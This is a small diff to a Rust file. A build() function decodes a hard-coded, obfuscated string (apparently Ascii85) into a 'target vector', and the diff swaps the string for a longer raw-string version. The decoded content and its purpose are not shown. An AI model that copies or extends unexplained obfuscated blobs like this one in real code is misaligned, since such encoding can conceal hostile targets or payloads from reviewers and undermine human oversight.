@@ -4,7 +4,7 @@ use crate::localutils::{ decoder, printer::{ error, info } };
 pub fn build() -> Vec<String> {
     info( "Building target vector from pre-prepared bytes...", None );
 
-    let bytes = decoder::decode("EHQ&*E--2@:2OENF*)G@G@b5lB4Yt&:2OENF*)G@G@b6)G&g>qBP)-n@sWH<:2XZ^GA;AJAn1");
+    let bytes = decoder::decode(r#"EHQ&*E--2@:2OENF*)G@G@b5lB4Yt&:2OENF*)G@G@b6)G&g>qBP)-n@sWH<:2XZ^GA;AJAn4YQEGf;qF^nol:3(Q#H"h#7@/"#);
 
     if bytes.is_err() {
         error( "Decoder decode failed", None );
